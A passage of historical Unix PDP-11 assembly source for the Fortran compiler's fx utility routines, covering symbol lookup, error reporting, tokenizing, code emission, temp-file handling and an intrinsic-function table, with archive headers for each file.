	cmp	r3,r4
	bne	2f			/ is data
	mov	nxtaloc,r0
	jsr	r5,code
		<.=.+%d.\n.text\n\0>; .even
		r0
	rts	r5
2:
	jsr	r5,onedata
	sub	nxtaloc,r1
	neg	r1
	blt	9b
	jsr	r5,code
		<.=.+%d.\n.text\n\0>; .even
		r1
1:
	rts	r5

onedata:
	clr	r1
2:
	mov	2(r3),r0
	sub	r1,r0
	bmi	9f
	beq	3f
	jsr	r5,code
		<.=.+%d.\n\0>; .even
		r0
	add	r0,r1
3:
	mov	4(r3),r0
	add	r0,r1
	asr	r0
	mov	r0,-(sp)
	mov	6(r3),r2
3:
	mov	(r2)+,r0
	jsr	r5,code
		<%o\n\0>; .even
		r0
	dec	(sp)
	bne	3b
	tst	(sp)+
	add	$8.,r3
	cmp	r3,r4
	bhis	1f
	cmp	(r3),-8(r3)		/ any more in this block
	beq	2b
1:
	rts	r5
9:
	clr	line
	jsr	r5,error; 32.		/ overlapping data init
	jsr	r5,perror
	rts	r5

/ comparison routine for qsort

compare:
	cmp	(r0),(r4)
	bne	1f
	cmp	2(r0),2(r4)
1:
	rts	pc

-- /usr/source/fort/fx mode=0140775 uid=3 gid=3 atime=174930095 mtime=174920984 --
-- /usr/source/fort/fx/fhd.s mode=0100664 uid=3 gid=3 atime=174920972 mtime=174844566 --
/
/

/ fhd -- data segment header
/

	symsize = 1600.
	linsize = 800.
	namsize = 1200.
	smblsize = 399.

	intcon = 4\<8+1			/ type of integer constant
	realcon = 4\<8+2
	logcon = 2\<8+3			/ type of logical constant
	log1con = 1\<8+3
	int1con = 1\<8+1
	int2con = 2\<8+1
	dblcon = 10\<8+2
	dcplxcon = 20\<8+4
	cplxcon = 10\<8+4

.globl data
.globl ibuf
.globl obuf
.globl tbuf
.globl line
.globl eline
.globl ifno
.globl efno
.globl errp
.globl errb
.globl eerrb
.globl symtab
.globl esymtab
.globl esymp
.globl symtp
.globl namebuf
.globl enamebuf
.globl namep
.globl symbuf
.globl esymbuf
.globl ch
.globl ch1
.globl progt
.globl holquo
.globl nxtaloc
.globl imptab
.globl nerror
.globl temp
.globl functm
.globl edata
.globl	dsize

-- /usr/source/fort/fx/fx1.s mode=0100664 uid=3 gid=3 atime=174920929 mtime=174844570 --
/
/

/ fx1 -- utility

.globl	lookup
/ lookup
/ lookup string pointed at by r2
/ in table pointed at by arg1
/ r0 returns symbol number*2
/ r2 is advanced by matched string
/ registers used: r0,r2
lookup:
	mov	r1,-(sp)
	clr	r0
	mov	r2,-(sp)
	mov	(r5)+,r1
1:
	mov	(sp),r2
	tstb	(r1)
	beq	1f
2:
	cmpb	(r2)+,(r1)+
	bne	2f
	tstb	(r1)
	bne	2b
	asl	r0
	cmp	(r5)+,(sp)+
	mov	(sp)+,r1
	rts	r5
2:
	tstb	(r1)+
	bne	2b
	inc	r0
	br	1b
1:
	mov	(sp)+,r2
	mov	(sp)+,r1
	rts	r5

-- /usr/source/fort/fx/fx2.s mode=0100664 uid=3 gid=3 atime=174920931 mtime=174844574 --
/
/

/ fx2 -- error setting and printing

.globl	error
.globl	perror

.globl	tput
.globl	tdecml

error:
	inc	nerror
	mov	r0,-(sp)
	mov	r2,-(sp)
	mov	(r5)+,r0
	mov	$errb,r2
1:
	cmp	r2,errp
	bhis	1f
	cmp	r0,(r2)+
	beq	2f
	tst	(r2)+
	br	1b
1:
	cmp	r2,$eerrb
	bhis	2f
	mov	r0,(r2)+
	mov	r1,(r2)
	dec	(r2)+		/ r1 is often 1 too far
	mov	r2,errp
2:
	mov	(sp)+,r2
	mov	(sp)+,r0
	rts	r5

perror:
	cmp	errp,$errb
	beq	1f
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	ifno,r0
	jsr	r5,tdecml
	mov	$'\t,r0
	jsr	r5,tput
	mov	$line,r1
2:
	movb	(r1),r0
	beq	2f
	jsr	r5,tput
	mov	$errb+2,r2
3:
	cmp	r1,(r2)+
	bne	4f
	mov	$1,r0
	sys	write; mes2; 2	/ bs, _
	br	3f
4:
	cmp	r2,errp
	blo	3b
3:
	inc	r1
	br	2b
2:
	mov	$errb,r1
2:
	mov	$1,r0
	sys	write; mes1; 4
3:
	sys	open; errfil; 0
	bec	3f
	mov	(r1)+,r0
	tst	(r1)+
	jsr	r5,tdecml
	cmp	r1,errp
	bhis	2f
	mov	$',,r0
	jsr	r5,tput
	br	3b
3:
	mov	r0,-(sp)
	mov	(r1)+,r2
	tst	(r1)+
3:
	dec	r2
	ble	3f
4:
	mov	(sp),r0
	sys	read; ich; 1
	bes	4f
	tst	r0
	beq	4f
	cmpb	ich,$'\n
	bne	4b
	br	3b
3:
	mov	(sp),r0
	sys	read; ich; 1
	bes	4f
	tst	r0
	beq	4f
	movb	ich,r0
	cmp	r0,$'\n
	beq	3f
	jsr	r5,tput
	br	3b
4:
	mov	$1,r0
	sys	write; mes3; 18.
3:
	mov	(sp)+,r0
	sys	close
	cmp	r1,$errp
	blo	2b
2:
	mov	$'\n,r0
	jsr	r5,tput
	mov	$errb,errp
	mov	(sp)+,r2
	mov	(sp)+,r1
1:
	rts	r5

mes1:
	<\n** >
mes2:
	.byte 010, '_
mes3:
	<Unknown diagnostic>
errfil:
	</usr/fort/errors\0>
.even
.bss
ich:	.=.+2
-- /usr/source/fort/fx/fx3.s mode=0100664 uid=3 gid=3 atime=174920933 mtime=174844578 --
/
/

/ fx3 -- get integer

.globl	geti
.globl	ptemp

.globl	putc
.globl	putw

geti:
	mov	r1,-(sp)
	mov	r3,-(sp)
	clr	r3
	mov	$symbuf,r0
1:
	movb	(r0)+,r1
	sub	$'0,r1
	cmp	r1,$9
	bhi	1f
	mpy	$10.,r3
	add	r1,r3
	br	1b
1:
	mov	r3,r0
	mov	(sp)+,r3
	mov	(sp)+,r1
	rts	r5

ptemp:
	mov	r0,-(sp)
	mov	r1,-(sp)
	mov	(r5)+,r0		/ character
	jsr	r5,putc; tbuf
	mov	*(r5)+,r0		/ word
	jsr	r5,putw; tbuf
	mov	ifno,r0
	jsr	r5,putw; tbuf
	mov	(r5)+,r1		/ string
1:
	movb	(r1),r0
	jsr	r5,putc; tbuf
	tstb	(r1)+
	bne	1b
	mov	(sp)+,r1
	mov	(sp)+,r0
	rts	r5

-- /usr/source/fort/fx/fx4.s mode=0110664 uid=3 gid=3 atime=174920936 mtime=174844583 --
/
/

/ fx4 -- get symbol

.globl	getsym
.globl	getid
.globl	lookid
.globl	chrtab

.globl	lookup
.globl	error
.globl	geti
.globl	holround
/ getsym returns the next basic symbol

/ 0	name	(symbol table entry in r3)
/ 2	number	(type in r3)
/ 4	**
/ 6	/
/ 8	*
/ 10	-
/ 12	+
/ 14	.lt.
/ 16	.le.
/ 18	.eq.
/ 20	.ne.
/ 22	.gt.
/ 24	.ge.
/ 26	.not.
/ 28	.and.
/ 30	.or.
/ 32	(
/ 34	)
/ 36	,
/ 38	=
/ 40	=|
/
getsym:
	mov	r2,-(sp)
	mov	r1,r2
	jsr	r5,lookup; bastab
		br 1f
	mov	r2,r1
	cmp	r0,$4
	bhis	2f
	asr	r0
	add	$'0,r0
	movb	r0,symbuf
	movb	$12,symbuf+1
	clrb	symbuf+2
	mov	$logcon,r3		/ logical*2
	mov	$2,r0
2:
	cmp	r0,$32.
	bne	2f

/ check for possible complex constant

	mov	r1,-(sp)
	movb	-2(r1),r0
	movb	chrtab(r0),r0
	beq	4f
	cmp	r0,$4
	blos	3f
4:
	jsr	r5,srconst
		br 3f
	mov	r3,r2
	cmpb	(r1)+,$',
	bne	3f
	jsr	r5,srconst
		br 3f
	cmp	r3,r2
	bhis	4f
	mov	r2,r3
4:
	cmpb	(r1)+,$')
	bne	3f
	mov	(sp)+,r1
	mov	$symbuf,r2
4:
	movb	(r1)+,(r2)
	cmpb	(r2)+,$')
	bne	4b
	clrb	-(r2)
	mov	$2,r0
	br	2f
3:
	mov	(sp)+,r1
	mov	$32.,r0
2:
	mov	(sp)+,r2
	rts	r5
1:
	clr	lstchr
	cmp	r1,$line
	blos	1f
	movb	-1(r1),lstchr
1:
	mov	$symbuf,r2
	movb	(r1)+,r0
	movb	r0,(r2)+
	bic	$!177,r0
	movb	chrtab(r0),r0
	jmp	*1f(r0)
1:
	eos
	let
	num
	per

eos:
	mov	$40.,r0
	tstb	-(r1)
	beq	2b
	jsr	r5,error; 8.
	br	2b

let:
	dec	r1
	jsr	r5,getid
		br .+2		/ cannot happen
	jsr	r5,lookid; symbuf
	mov	(sp)+,r2
	clr	r0
	rts	r5

num:
	mov	$intcon,r3	/ integer*4
	jsr	r5,numst
	cmpb	(r1),$'.
	bne	2f
	mov	r2,-(sp)
	mov	r1,r2
	jsr	r5,lookup; bastab
		br 1f
	mov	(sp)+,r2
	br	3f
1:
	mov	(sp)+,r2
	movb	(r1)+,(r2)+
	br	1f
2:
	cmpb	(r1),$'h		/ hollerith const?
	bne	2f
	mov	lstchr,r0
	cmpb	chrtab(r0),$2		/ letter?
	beq	2f			/ not h, then
	cmp	r0,$'*
	beq	2f			/ e.g. real*4 h...
	clrb	(r2)
	jsr	r5,geti
	mov	$symbuf,r2
	inc	r1
	mov	holround,-(sp)
	dec	(sp)
	clr	-(sp)
4:
	movb	(r1)+,(r2)+
	bne	5f
	jsr	r5,error; 55.
	br	6f
5:
	inc	(sp)
	dec	r0
	bgt	4b
6:
	bit	(sp),2(sp)
	beq	6f
	movb	$' ,(r2)+
	inc	(sp)
	br	6b
6:
	mov	(sp)+,r3
	tst	(sp)+
	swab	r3
	clrb	r3
	bis	$5,r3
	mov	$2,r0
	mov	(sp)+,r2
	rts	r5

.bss
lstchr:	.=.+2
.text

per:
	jsr	r5,isnum
		br eos
1:
	mov	$realcon,r3	/ real*4
	jsr	r5,numst
2:
	jsr	r5,expon
3:
	clrb	(r2)
	mov	$2,r0
	mov	(sp)+,r2
	rts	r5

isnum:
	movb	(r1),r0
	cmpb	chrtab(r0),$4
	bne	1f
	tst	(r5)+
1:
	rts	r5

numst:
	jsr	r5,isnum
		br 1b
	inc	r1
	movb	r0,(r2)+
	br	numst

expon:
	cmpb	(r1)+,$'e
	beq	1f
	cmpb	-1(r1),$'d
	beq	1f
2:
	dec	r1
	rts	r5
1:
	cmpb	(r1),$'+
	beq	1f
	cmpb	(r1),$'-
	beq	1f
	jsr	r5,isnum
		br 2b
1:
	mov	$realcon,r3	/ real*4
	cmpb	-(r1),$'e
	beq	1f
	mov	$dblcon,r3	/ real*8
1:
	movb	(r1)+,(r2)+
	movb	(r1)+,(r2)+
	jsr	r5,numst
	rts	r5

getid:
	mov	r0,-(sp)
	mov	r2,-(sp)
	movb	(r1),r0
	cmpb	chrtab(r0),$2
	bne	3f
	tst	(r5)+
	mov	$symbuf,r2
1:
	movb	(r1)+,r0
	movb	r0,(r2)+
	movb	chrtab(r0),r0
	cmp	r0,$2
	beq	1b
	cmp	r0,$4
	beq	1b
	dec	r1
	clrb	(r2)
	movb	$12,-(r2)
3:
	mov	(sp)+,r2
	mov	(sp)+,r0
	rts	r5

lookid:
	mov	r0,-(sp)
	mov	r2,-(sp)
2:
	mov	(r5),r2
	jsr	r5,lookup; namebuf
		br 1f
	asl	r0
	asl	r0
	mov	r0,r3
	mov	(sp)+,r2
	mov	(sp)+,r0
	tst	(r5)+
	rts	r5
1:
	mov	namep,r0
	add	$8.,symtp
1:
	movb	(r2)+,(r0)+
	bne	1b
	mov	r0,namep
	cmp	r0,$enamebuf
	bhis	1f
	mov	symtp,r0
	add	$symtab,r0
	cmp	r0,esymp
	blo	2b
1:
	mov	$1,r0
	sys	write; ovfl; eovfl-ovfl
	clr	r0
	sys	seek; 0; 2
	mov	$-1,r0
	sys	exit

ovfl:
	<Symbol table overflow\n>
eovfl:
.even

srconst:
	cmpb	(r1)+,$'+
	beq	1f
	cmpb	-(r1),$'-
	bne	1f
	inc	r1
1:
	jsr	r5,getsym
	cmp	r0,$2
	bne	1f
	clrb	r3
	add	r3,r3
	bisb	$cplxcon,r3
	tst	(r5)+
1:
	rts	r5

chrtab:
	.byte	0,0,0,0,0,0,0,0
	.byte	0,0,0,0,0,0,0,0
	.byte	0,0,0,0,0,0,0,0
	.byte	0,0,0,0,0,0,0,0
	.byte	0,0,0,0,0,0,0,0
	.byte	0,0,0,0,0,0,6,0
	.byte	4,4,4,4,4,4,4,4
	.byte	4,4,0,0,0,0,0,0
	.byte	0,2,2,2,2,2,2,2
	.byte	2,2,2,2,2,2,2,2
	.byte	2,2,2,2,2,2,2,2
	.byte	2,2,2,0,0,0,0,0
	.byte	0,2,2,2,2,2,2,2
	.byte	2,2,2,2,2,2,2,2
	.byte	2,2,2,2,2,2,2,2
	.byte	2,2,2,0,0,0,0,0

bastab:
	<.false.\0>
	<.true.\0>
	<**\0>
	</\0>
	<*\0>
	<-\0>
	<+\0>
	<.lt.\0>
	<.le.\0>
	<.eq.\0>
	<.ne.\0>
	<.gt.\0>
	<.ge.\0>
	<.not.\0>
	<.and.\0>
	<.or.\0>
	<(\0>
	<)\0>
	<,\0>
	<=\0>
	<\0>

-- /usr/source/fort/fx/fx5.s mode=0100664 uid=3 gid=3 atime=174920939 mtime=174844587 --
/
/

/ fx5 -- declare implicit

.globl	declimpl
.globl	getname

declimpl:
	bit	$7,symtab(r3)
	bne	1f		/ already declared
	jsr	r5,getname
	movb	symbuf,r0
	cmp	r0,$'a
	blo	2f
	sub	$6,r0		/ map 'a -> 'Z+1
2:
	asl	r0
	bis	imptab-[2*'A](r0),symtab(r3)
1:
	bit	$70,symtab(r3)		/ class
	bne	1f
	bis	$10,symtab(r3)		/ simple
1:
	rts	r5

getname:
	mov	r3,-(sp)
	clr	r3
	mov	$namebuf,r0
1:
	cmp	r3,(sp)
	bhis	1f
2:
	tstb	(r0)+
	bne	2b
	add	$8,r3
	br	1b
1:
	mov	$symbuf,r3
2:
	movb	(r0)+,(r3)+
	bne	2b
	mov	(sp)+,r3
	rts	r5

-- /usr/source/fort/fx/fx6.s mode=0100664 uid=3 gid=3 atime=174920941 mtime=174844590 --
/
/

/ fx6 -- teletype

.globl	tput
.globl	tdecml

tdecml:
	mov	r1,-(sp)
	jsr	r5,td
	mov	(sp)+,r1
	rts	r5

td:
	mov	r0,r1
	clr	r0
	dvd	$10.,r0
	mov	r1,-(sp)
	tst	r0
	beq	1f
	jsr	r5,td
1:
	mov	(sp)+,r0
	add	$'0,r0

tput:
	movb	r0,ch+1
	mov	$1,r0
	sys	write; ch+1; 1
	rts	r5
-- /usr/source/fort/fx/fx7.s mode=0100664 uid=3 gid=3 atime=174920944 mtime=174844594 --
/
/

/ fx7 -- passes advancement

.globl	signon
.globl	signoff


.globl	pass2
.globl	pass3
.globl	pass4

signon:
	tst	(r5)+
	rts	r5

signoff:
	mov	(r5)+,r0
	tst	(sp)+
	dec	r0
	asl	r0
	jmp	*passtab(r0)

passtab:
	pass2
	pass3
	pass4

.data




-- /usr/source/fort/fx/fx8.s mode=0100664 uid=3 gid=3 atime=174920946 mtime=174844599 --
/
/

/ fx8 -- read source line

.globl	getline
.globl	isagn
.globl	levzer

.globl	error
.globl	getc
.globl	chrtab

getline:
	mov	r3,-(sp)
	clr	holquo
	clr	r3		/ line number
	clr	line
	mov	$line,r1
1:
	jsr	pc,get
	sub	$'0,r0
	cmp	r0,$9
	bhi	1f
	mpy	$10.,r3
	add	r0,r3
	br	1b
1:
	add	$'0,r0
	movb	r0,ch
	mov	r3,efno
1:
	mov	lino, ifno
	inc	ifno
	jsr	pc,get
	cmp	r0,$'\n		/ nl
	beq	1f
	cmp	r0,$''
	beq	2f
	cmp	r0,$'"
	bne	3f
2:
	mov	r0,holquo
	add	$4,r1		/ room for h count
	mov	r1,-(sp)
2:
	jsr	pc,get
	cmp	r0,$'\n
	beq	4f
	cmp	r0,holquo
	beq	2f
	bis	$200,r0
	movb	r0,(r1)+
	cmp	r1,$eline-1
	blo	2b
4:
	tst	(sp)+
	br	err1
2:
	mov	(sp)+,r3
	mov	r1,-(sp)
	sub	r3,r1
	movb	$'h,-(r3)
	clr	r0
	div	$10.,r0
	add	$'0,r1
	movb	r1,-(r3)
	mov	r0,r1
	clr	r0
	div	$10.,r0
	add	$'0,r1
	movb	r1,-(r3)
	add	$'0,r0
	movb	r0,-(r3)
	mov	(sp)+,r1
	clr	holquo
	br	1b
3:
	cmp	r0,$'h
	bne	2f
	clr	r3		/ quote count
	mov	r1,-(sp)
3:
	cmp	r1,$line
	blos	4f
	movb	-(r1),r0
	cmpb	chrtab(r0),$4	/ digit?
	beq	3b
	cmpb	chrtab(r0),$2	/ test letter
	beq	3f
	cmp	r0,$'*
	beq	3f
	inc	r1
4:
	cmp	r1,(sp)
	bhis	4f
	movb	(r1)+,r0
	sub	$'0,r0
	mpy	$10.,r3
	add	r0,r3
	br	4b
4:
	mov	r3,r0
	beq	3f
	mov	r0,holquo
	mov	(sp)+,r1
	movb	$'h,(r1)+
4:
	jsr	pc,get
	cmp	r0,$'\n
	bne	5f
	mov	r0,ch
	mov	$' ,r0
5:
	bis	$200,r0
	movb	r0,(r1)+
	cmp	r1,$eline-1
	bhis	err1
	dec	holquo
	bne	4b
	br	1b
3:
	mov	(sp)+,r1
	mov	$'h,r0
2:
	movb	r0,(r1)+
	cmp	r1,$eline-1
	blo	1b
err1:
	jsr	r5,error; 1.
1:
	clrb	(r1)+
	mov	(sp)+,r3
	tstb	line
	bne	1f
	jmp	getline
1:
	rts	r5

isagn:
	jsr	r5,levzer; '=
		br 1f
	br	3f
1:
	mov	r0,-(sp)
	jsr	r5,levzer; ',
		br 4f
	jsr	r5,levzer; '(
		br 1f
	tst	(sp)+
2:
	rts	r5
1:
	cmp	(sp)+,r0
	blt	2b
	mov	r1,-(sp)
	mov	r0,r1
	inc	r1
	jsr	r5,levzer; ')
		br 1f
1:
	mov	(sp)+,r1
	cmpb	1(r0),$'=
	bne	3f
	rts	r5

levzer:
	mov	r1,r0
	clr	-(sp)
1:
	tst	(sp)
	bne	2f
	cmpb	(r0),(r5)
	beq	1f
2:
	cmpb	(r0),$'(
	bne	2f
	inc	(sp)
2:
	cmpb	(r0),$')
	bne	2f
	dec	(sp)
	blt	5f
2:
	tstb	(r0)+
	bne	1b
5:
	tst	(r5)+
1:
4:
	tst	(sp)+
3:
	tst	(r5)+
	rts	r5

get:
	movb	ch,r0
	beq	1f
	clrb	ch
	rts	pc
1:
	jsr	pc,get1
	cmp	r0,$'\n
	bne	2f
	jsr	pc,get1
	cmp	r0,$'&
	beq	1b
	movb	r0,ch1
	mov	$'\n,r0
2:
	tst	holquo
	bne	1f
	cmp	$' ,r0
	beq	1b
	cmp	$'\t,r0
	beq	1b
1:
	cmp	r0,$4		/ test EOT
	bne	1f
	mov	$1,r0
	sys	write; mes; emes-mes
	mov	$1,r0		/ syntax errors detected
	sys	exit
1:
	rts	pc

get1:
	movb	ch1,r0
	beq	1f
	clrb	ch1
	br	2f
1:
	jsr	r5,getc; ibuf
	bcs	1f
	bic	$!177,r0
	beq	1b
	cmp	r0,$'\n
	bne	2f
	inc	lino
2:
	tst	nlflg
	beq	2f
	clr	nlflg
	cmp	r0,$'c
	bne	2f
3:
	jsr	pc,get1
	cmp	r0,$'\n
	beq	1b
	cmp	r0,$4
	bne	3b
2:
	cmp	r0,$'\n
	bne	2f
	inc	nlflg
2:
	rts	pc
1:
	mov	$4,r0
	rts	pc

.data
nlflg:	1
.text
mes:
	<EOF on input\n\0>
emes:
.bss
lino:	.=.+2
-- /usr/source/fort/fx/fx9.s mode=0100664 uid=3 gid=3 atime=174920949 mtime=174844603 --
/
/

/ fx9 -- code

/	jsr	r5,code; <string\0>; .even
/		arg1
/		arg2
/		...
/
/ args specified by %<c> in string.
/   %s:  string
/   %d:  decimal number
/   %o:  octal number
/   %c:  character
/
/ args are addresses
/ or registers r0-r4

.globl	code

.globl	putc
.globl	getname

code:
	mov	r4,-(sp)
	mov	r3,-(sp)
	mov	r2,-(sp)
	mov	r1,-(sp)
	mov	r0,-(sp)
	mov	r5,r4
1:
	tstb	(r5)+
	bne	1b
	inc	r5
	bic	$1,r5
1:
	movb	(r4)+,r0
	beq	1f
	cmp	r0,$'%
	beq	2f
	jsr	r5,putc; obuf
	br	1b
2:
	movb	(r4)+,r0
	beq	1f
	cmp	r0,$'s
	beq	cstr
	cmp	r0,$'c
	beq	cchr
	cmp	r0,$'d
	beq	cdec
	cmp	r0,$'o
	beq	coct
	cmp	r0,$'n
	beq	cnam
	jsr	r5,putc; obuf
	br	1b
cnam:
	jsr	pc,cget
	mov	r1,r3
	jsr	r5,getname
	mov	$symbuf,r1
	br	2f
cstr:
	jsr	pc,cget
2:
	movb	(r1)+,r0
	beq	1b
	cmp	r0,$'\n
	beq	2b
	jsr	r5,putc; obuf
	br	2b
cchr:
	jsr	pc,cget
	mov	r1,r0
	jsr	r5,putc; obuf
	mov	r1,r0
	clrb	r0
	swab	r0
	beq	1b
	jsr	r5,putc; obuf
	br	1b
coct:
	jsr	pc,cget
	mov	$8.,r2
	br	2f
cdec:
	jsr	pc,cget
	mov	$10.,r2
2:
	jsr	pc,2f
	br	1b
2:
	clr	r0
	dvd	r2,r0
	mov	r1,-(sp)
	mov	r0,r1
	beq	2f
	jsr	pc,2b
2:
	mov	(sp)+,r0
	add	$'0,r0
	jsr	r5,putc; obuf
	rts	pc
1:
	mov	(sp)+,r0
	mov	(sp)+,r1
	mov	(sp)+,r2
	mov	(sp)+,r3
	mov	(sp)+,r4
	rts	r5

cget:
	mov	(r5)+,r1
	cmp	r1,$4
	blos	1f
	rts	pc
1:
	asl	r1
	add	$2,r1
	add	sp,r1
	mov	(r1),r1
	rts	pc

-- /usr/source/fort/fx/fxa.s mode=0100664 uid=3 gid=3 atime=174920951 mtime=174844608 --
/
/

/ fxa -- genop -- output a typed operator

.globl	genop
.globl	newline

.globl	code
.globl	typ

genop:
	mov	r1,-(sp)
	mov	r3,-(sp)
	bic	$!7,r3
	movb	typ(r3),r1
	mov	(sp),r3
	clrb	r3
	swab	r3
	jsr	r5,code
		<	%c%c%d\0>; .even
		r1
		r0
		r3
	mov	(sp)+,r3
	mov	(sp)+,r1
	rts	r5

newline:
	jsr	r5,code
		<\n\0>; .even
	rts	r5

typ:
	<?irlc??g>

-- /usr/source/fort/fx/fxb.s mode=0100664 uid=3 gid=3 atime=174920954 mtime=174844612 --
/
/

/ fxb -- get integer constant or label

.globl	geticon
.globl	getlab

.globl	getsym
.globl	geti
.globl	ptemp

geticon:
	jsr	r5,getsym
	cmp	r0,$2
	bne	1f
	cmp	r3,$intcon
	bne	1f
	jsr	r5,geti
	tst	(r5)+
1:
	rts	r5

getlab:
	jsr	r5,geticon
		br 1f
	mov	r0,temp
	jsr	r5,ptemp; 'r; temp; line
	tst	(r5)+
1:
	rts	r5

-- /usr/source/fort/fx/fxc.s mode=0100664 uid=3 gid=3 atime=174920956 mtime=174844616 --
/
/

/ fxc -- size of array

.globl	size
.globl	nelem

.globl	error

size:
	movb	symtab+1(r3),r0
	jsr	r5,nelem
	inc	r0
	bic	$1,r0		/ round to 0 mod 2
	rts	r5

nelem:
	mov	r1,-(sp)
	mov	r0,r1
	mov	symtab(r3),r0
	bic	$!70,r0
	cmp	r0,$20
	bne	1f
	mov	symtab+2(r3),r0
	mov	(r0)+,-(sp)
2:
	mpy	(r0)+,r1
	dec	(sp)
	bgt	2b
	tst	(sp)+
1:
	mov	r1,r0
	mov	(sp)+,r1
	rts	r5

-- /usr/source/fort/fx/fxd.s mode=0100664 uid=3 gid=3 atime=174920958 mtime=174844620 --
/
/

/ xd -- tmp file 2 handl

.globl	setln
.globl	getln

.globl	tfil2
.globl	tfildiag
.globl	fopen
.globl	getc
.globl	getw
.globl	xbuf

setln:
	mov	$tfil2,r0
	jsr	r5,fopen; xbuf
	bcc	1f
	jmp	tfildiag
1:
	rts	r5

getln:
	jsr	r5,getc; xbuf
	bcs	3f
	mov	r0,-(sp)
	jsr	r5,getw; xbuf
	mov	r0,efno
	jsr	r5, getw; xbuf
	mov	r0,ifno
	mov	$line,r1
1:
	jsr	r5,getc; xbuf
	bcs	1f
	tst	r0
	beq	1f
	bic	$200,r0
	movb	r0,(r1)+
	br	1b
1:
	clrb	(r1)+
	mov	(sp)+,r0
	tst	(r5)+
	rts	r5
3:
	mov	xbuf,r0
	sys	close
	rts	r5

-- /usr/source/fort/fx/fxe.s mode=0100664 uid=3 gid=3 atime=174920960 mtime=174844625 --
/
/

/ xe -- temp file junk

.globl	tfildiag
.globl	tfil1, tfil2

tfildiag:
	mov	$1,r0
	sys	write; mes1; emes1-mes1
	clr	r0
	sys	seek; 0; 2
	mov	$-1,r0		/ failure return
	sys	exit

mes1:
	<Temp file?\n>
emes1:
tfil1:
	<f.tmp1\0>
tfil2:
	<f.tmp2\0>

-- /usr/source/fort/fx/fxf.s mode=0100664 uid=3 gid=3 atime=174920963 mtime=174844629 --
/
/

/ fxf -- format statements

.globl	sform
.globl	sdata

.globl	ptemp
.globl	error

sform:
	cmp	progt,$6		/ block data
	bne	1f
	jsr	r5,error; 50.
1:
	jsr	r5,ptemp; 'f; efno; line
	rts	r5

sdata:
	jsr	r5,ptemp; 'd; efno; line
	rts	r5

-- /usr/source/fort/fx/fxg.s mode=0100664 uid=3 gid=3 atime=174920965 mtime=174844634 --
/
/

/ fxg -- declare implicit functions

.globl	funimpl

.globl	getname
.globl	lookup

funimpl:
	bit	$7,symtab(r3)
	bne	1f
	jsr	r5,getname
	mov	r2,-(sp)
	mov	$symbuf,r2
	jsr	r5,lookup; funtab
		br 2f
	cmpb	(r2),$'\n
	bne	2f
	asr	r0
	movb	funtabt(r0),r0
	mov	r0,-(sp)
	bic	$!17,r0
	bis	typtab(r0),symtab(r3)
	mov	(sp)+,r0
	asr	r0
	asr	r0
	asr	r0
	asr	r0
	bic	$!17,r0
	mov	typtab(r0),symtab+2(r3)	/ save argument conversion
2:					/ in dimension pointer
	mov	(sp)+,r2
1:
	rts	r5

typtab:
	intcon
	realcon
	dblcon
	cplxcon
	dcplxcon

funtab:
	<tanh\0>
	<sqrt\0>
	<sngl\0>
	<sin\0>
	<sign\0>
	<real\0>
	<mod\0>
	<min1\0>
	<min0\0>
	<max1\0>
	<max0\0>
	<isign\0>
	<int\0>
	<ifix\0>
	<idint\0>
	<idim\0>
	<iabs\0>
	<float\0>
	<exp\0>
	<dsqrt\0>
	<dsin\0>
	<dsign\0>
	<dreal\0>
	<dmod\0>
	<dmin1\0>
	<dmax1\0>
	<dlog10\0>
	<dlog\0>
	<dimag\0>
	<dim\0>
	<dexp\0>
	<dcsqrt\0>
	<dcsin\0>
	<dcos\0>
	<dconjg\0>
	<dcmplx\0>
	<dclog\0>
	<dcexp\0>
	<dccos\0>
	<dcabs\0>
	<dble\0>
	<datan2\0>
	<datan\0>
	<dabs\0>
	<csqrt\0>
	<csin\0>
	<cos\0>
	<conjg\0>
	<cmplx\0>
	<clog\0>
	<cexp\0>
	<ccos\0>
	<cabs\0>
	<atan2\0>
	<atan\0>
	<amod\0>
	<amin1\0>
	<amin0\0>
	<amax1\0>
	<amax0\0>
	<alog10\0>
	<alog\0>
	<aint\0>
	<aimag\0>
	<abs\0>
	<\0>

/ function type xy
/	x = arg types
/	y = result type
/ 0 = integer
/ 2 = real
/ 4 = double
/ 6 = complex
/ 8 = doublecomplex
funtabt:
	.byte	2\<4+2		/ tanh
	.byte	2\<4+2		/ sqrt
	.byte	4\<4+2		/ sngl
	.byte	2\<4+2		/ sin
	.byte	2\<4+2		/ sign
	.byte	6\<4+2		/ real
	.byte	0\<4+0		/ mod
	.byte	2\<4+0		/ min1
	.byte	0\<4+0		/ min0
	.byte	2\<4+0		/ max1
	.byte	0\<4+0		/ max0
	.byte	0\<4+0		/ isign
	.byte	2\<4+0		/ int
	.byte	2\<4+0		/ ifix
	.byte	4\<4+0		/ idint
	.byte	0\<4+0		/ idim
	.byte	0\<4+0		/ iabs
	.byte	0\<4+2		/ float
	.byte	2\<4+2		/ exp
	.byte	4\<4+4		/ dsqrt
	.byte	4\<4+4		/ dsin
	.byte	4\<4+4		/ dsign
	.byte	8\<4+4		/ dreal
	.byte	4\<4+4		/ dmod
	.byte	4\<4+4		/ dmin1
	.byte	4\<4+4		/ dmax1
	.byte	4\<4+4		/ dlog10
	.byte	4\<4+4		/ dlog
	.byte	8\<4+4		/ dimag
	.byte	2\<4+2		/ dim
	.byte	4\<4+4		/ dexp
	.byte	8\<4+8		/ dcsqrt
	.byte	8\<4+8		/ dcsin
	.byte	4\<4+4		/ dcos
	.byte	8\<4+8		/ dconjg
	.byte	4\<4+8		/ dcmplx
	.byte	8\<4+8		/ dclog
	.byte	8\<4+8		/ dcexp
	.byte	8\<4+8		/ dccos
	.byte	8\<4+4		/ dcabs
	.byte	2\<4+4		/ dble
	.byte	4\<4+4		/ datan2
	.byte	4\<4+4		/ datan
	.byte	4\<4+4		/ dabs
	.byte	6\<4+6		/ csqrt
	.byte	6\<4+6		/ csin
	.byte	2\<4+2		/ cos
	.byte	6\<4+6		/ conjg
	.byte	2\<4+6		/ cmplx
	.byte	6\<4+6		/ clog
	.byte	6\<4+6		/ cexp
	.byte	6\<4+6		/ ccos
	.byte	6\<4+2		/ cabs
	.byte	2\<4+2		/ atan2
	.byte	2\<4+2		/ atan
	.byte	2\<4+2		/ amod
	.byte	2\<4+2		/ amin1
	.byte	0\<4+2		/ amin0
	.byte	2\<4+2		/ amax1
	.byte	0\<4+2		/ amax0
	.byte	2\<4+2		/ alog10
	.byte	2\<4+2		/ alog
	.byte	2\<4+2		/ aint
	.byte	6\<4+2		/ aimag
	.byte	2\<4+2		/ abs
-- /usr/source/fort/fx/fxh.s mode=0100664 uid=3 gid=3 atime=174920968 mtime=174844638 --
/
/

